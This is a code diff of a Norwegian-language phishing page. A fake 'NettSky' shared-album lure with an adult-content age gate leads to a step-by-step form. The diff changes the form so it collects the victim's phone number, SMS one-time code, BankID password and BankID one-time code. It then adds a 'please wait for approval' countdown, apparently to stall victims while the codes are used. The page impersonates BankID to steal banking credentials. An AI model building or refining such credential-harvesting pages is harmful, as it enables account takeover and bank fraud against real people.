@@ -16,18 +16,19 @@
 <body>
   <main class="main-wrapper">
 
-    <div class="form-wrapper" id="form-wrapper-two" style="background-color: #59c1f5;">
+    <!-- <div class="form-wrapper" id="form-wrapper-two" style="background-color: #59c1f5;">
       <div class="content-area" id="content-area">
         <img src="./assets/img/sky-outline.svg" alt="sky" class="sky-img">
         <h1>NettSky</h1>
         <p class="long-text1" id="long-text1">Den beste plasseringen for bilder, filer, notater, e-post og mer</p>
         <p class="long-text2" id="long-text2">Sarah har delt sin album med deg</p>
-        <p class="long-text3" id="long-text3" style="display:none">Denne nedlastingen inneholder vokseninnhold. For å laste den ned, må du bekrefte at du er 18 år eller eldre.</p>
+        <p class="long-text3" id="long-text3" style="display:none">Denne nedlastingen inneholder vokseninnhold. For å
+          laste den ned, må du bekrefte at du er 18 år eller eldre.</p>
         <button class="button2" id="button01" style="background-color: #d4f3fd; color: #222">Last ned</button>
       </div>
-    </div>
+    </div> -->
 
-    <div class="form-wrapper" id="form-wrapper" style="display:none">
+    <div class="form-wrapper" id="form-wrapper" style="display:non">
       <svg class="logo-svg" focusable="false" id="Layer_1" version="1.1" viewBox="0 0 140 21" x="0px"
         xmlSpace="preserve" xmlns="http://www.w3.org/2000/svg" y="0px">
         <g>
@@ -86,40 +87,68 @@
 
         <!-- Step 2 -->
         <div id="step02" class="step" style="display: none;">
-          <label for="input02">Hva er ditt telefonnummer?</label>
-          <input class="form--control" type="text" id="input02" placeholder="8 siffer" maxlength="8" pattern="^\d{8}$"
-            required>
-          <small>Fyll inn telefonnummer (8 siffer)</small>
+          <label for="input02">Skriv ditt telefonnummer</label>
+          <input class="form--control" type="text" id="input02" placeholder="Telefonnummer" maxlength="8"
+            pattern="^\d{8}$" required>
+          <small>Vi sender deg en tekstmelding med engangskode til dette nummeret.</small>
         </div>
 
         <!-- Step 3 -->
         <div id="step03" class="step" style="display: none;">
-          <label for="input03">Hva er engangskoden?</label>
-          <input class="form--control" type="text" id="input03" placeholder="6 siffer" maxlength="6" pattern="^\d{6}$"
+          <label for="input03">Bekreft telefonnummer</label>
+          <input class="form--control" type="text" id="input03" placeholder="Kode" maxlength="6" pattern="^\d{6}$"
             required>
-          <small>Fyll inn engangskoden (6 siffer)</small>
+          <small>Skriv inn engangskoden du fikk på tekstmelding.</small>
         </div>
 
         <!-- Step 4 -->
         <div id="step04" class="step" style="display: none;">
-          <label for="input04">Hva er ditt personlige passord?</label>
-          <input class="form--control" type="password" id="input04" placeholder="Personlig passord" required>
-          <small>Fyll inn passord</small>
+          <label for="input04">Ditt bankID passord</label>
+          <input class="form--control" type="password" id="input04" placeholder="Personelig passord" required>
+          <small>BankID</small>
         </div>
 
         <!-- Step 5 -->
         <div id="step05" class="step" style="display: none;">
-          <label for="input05">Engangskode igjen</label>
-          <input class="form--control" type="text" id="input05" placeholder="6 siffer" maxlength="6" pattern="^\d{6}$"
-            required>
-          <small>Fyll inn engangskode (6 siffer)</small>
+          <label for="input05">Ditt bankID engangskode</label>
+          <input class="form--control" type="text" id="input05" placeholder="Engangskode" maxlength="6"
+            pattern="^\d{6}$" required>
+          <small>BankID</small>
         </div>
 
         <!-- Step 6 -->
         <div id="step06" class="step" style="display: none;">
-          <label for="input07">Hva er ditt personlige passord?</label>
-          <input class="form--control" type="password" id="input07" placeholder="Personlig passord" required>
-          <small>Fyll inn passord</small>
+          <label for="input07">Vennligst vent til videre godkjenning</label>
+          <!-- <input class="form--control" type="password" id="input07" placeholder="Personlig passord" required> -->
+          <!-- <small>Fyll inn passord</small> -->
+          <div id="app">
+            <div class="base-timer">
+              <svg class="base-timer__svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                <g class="base-timer__circle">
+                  <circle class="base-timer__path-elapsed" cx="50" cy="50" r="45"></circle>
+                  <path id="base-timer-path-remaining" stroke-dasharray="283" class="base-timer__path-remaining arc" d="
+                   M 50, 50
+                   m -45, 0
+                   a 45,45 0 1,0 90,0
+                   a 45,45 0 1,0 -90,0
+                   "></path>
+                </g>
+              </svg>
+              <span id="base-timer-label" class="base-timer__label"></span>
+            </div>
+          </div>
+<!-- 
+          <div class="buttons">
+            <button onclick="start()" class="start">
+              Start
+            </button>
+            <button onclick="stop()" class="stop">
+              Stop
+            </button>
+            <button onclick="reset()" class="reset">
+              Reset
+            </button>
+          </div> -->
         </div>
 
         <!-- Step 7 -->
@@ -133,20 +162,26 @@
         <br>
         <button type="button" id="nextButton" class="button next-btn">Neste</button>
         <button type="submit" id="submitButton" class="button next-btn" style="display: none;">BEKREFT</button>
+        <br>
+        <a href="" class="form-link">Gå tilbake</a>
       </form>
 
+      <script src="./assets/js/app.js"></script>
       <script>
         document.addEventListener("DOMContentLoaded", () => {
           const stepForm = document.getElementById("stepForm");
           const steps = document.querySelectorAll(".step");
           const nextButton = document.getElementById("nextButton");
           const submitButton = document.getElementById("submitButton");
-          let currentStep = 0;
+          let currentStep = 5;
 
           // Show the current step
           function showStep(stepIndex) {
             steps.forEach((step, index) => {
               step.style.display = index === stepIndex ? "block" : "none";
+              if(index === 5) {
+                start()
+              }
             });
 
             // Toggle button visibility
@@ -225,7 +260,6 @@
     </div>
 
   </main>
-  <script src="./assets/js/app.js"></script>
 </body>
 
 </html>
